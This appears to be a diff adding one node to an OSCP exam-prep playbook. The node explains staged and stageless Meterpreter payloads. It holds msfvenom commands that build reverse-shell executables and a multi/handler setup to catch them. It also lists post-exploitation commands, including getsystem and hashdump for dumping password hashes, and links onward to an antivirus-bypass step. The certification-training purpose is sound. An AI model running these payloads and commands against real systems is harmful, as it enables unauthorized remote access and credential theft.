@@ -1,0 +1,22 @@
+{
+  "id": "shell_meterpreter",
+  "phase": "SHELL",
+  "title": "Meterpreter Shell",
+  "body": "Meterpreter is allowed on OSCP for 3 of 5 machines. Staged payload needs a handler. Stageless is simpler. Know the difference and know when to use each.",
+  "cmd": "# -- STAGED vs STAGELESS ------------------\n# Staged (windows/x64/meterpreter/reverse_tcp):\n#   Small stager connects back → downloads full payload\n#   Needs: multi/handler running before execution\n#   Smaller file, better for size-limited delivery\n\n# Stageless (windows/x64/meterpreter_reverse_tcp):\n#   Full payload in one binary\n#   No handler dependency — nc won't work, need handler\n#   Better AV detection but simpler setup\n\n# -- GENERATE PAYLOAD ---------------------\n# Staged Windows x64\nmsfvenom -p windows/x64/meterpreter/reverse_tcp   LHOST=$lhost LPORT=$lport -f exe -o met_staged.exe\n\n# Stageless Windows x64\nmsfvenom -p windows/x64/meterpreter_reverse_tcp   LHOST=$lhost LPORT=$lport -f exe -o met_stageless.exe\n\n# Linux staged\nmsfvenom -p linux/x64/meterpreter/reverse_tcp   LHOST=$lhost LPORT=$lport -f elf -o met_linux.elf\n\n# -- HANDLER ------------------------------\nmsfconsole -q\nuse multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nset ExitOnSession false\nrun -j   # run as job, catches multiple sessions\n\n# -- USEFUL METERPRETER COMMANDS ----------\nsysinfo          # OS info\ngetuid           # current user\ngetsystem        # attempt privilege escalation\nhashdump         # dump SAM hashes (needs SYSTEM)\nupload shell.exe C:\\Windows\\Temp\\shell.exe\ndownload C:\\Users\\Administrator\\Desktop\\proof.txt\nshell            # drop to cmd.exe\nmigrate [PID]    # migrate to stable process\nrun post/multi/recon/local_exploit_suggester",
+  "warn": "OSCP limits meterpreter to 3 of 5 exam machines. Use it strategically — not as your default. The exam tests whether you can operate without it. Save it for machines where it provides clear value.",
+  "choices": [
+    {
+      "label": "Meterpreter session — post-exploit",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Meterpreter on Linux",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "AV killed it — bypass first",
+      "next": "amsi_bypass"
+    }
+  ]
+}
